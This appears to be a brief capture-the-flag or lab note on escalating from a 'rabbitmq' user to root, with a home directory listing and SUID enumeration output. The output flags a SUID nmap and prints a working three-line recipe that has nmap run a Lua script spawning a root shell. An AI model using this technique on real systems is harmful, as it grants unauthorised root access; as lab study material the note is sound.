# 6 box enum rabbitmq > privesc > root

```
rabbitmq@clyde:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Apr 21  2020 .
drwxr-xr-x 22 root root 4096 Apr 24  2020 ..
drwxr-xr-x  2 dana dana 4096 Jul  9  2020 dana
```

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/nmap
------------------------------

[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/nmap -~> https://gtfobins.github.io/gtfobins/nmap/#suid
------------------------------

[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Nmap ( /usr/bin/nmap )
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
/usr/bin/nmap --script=$TF
------------------------------
```
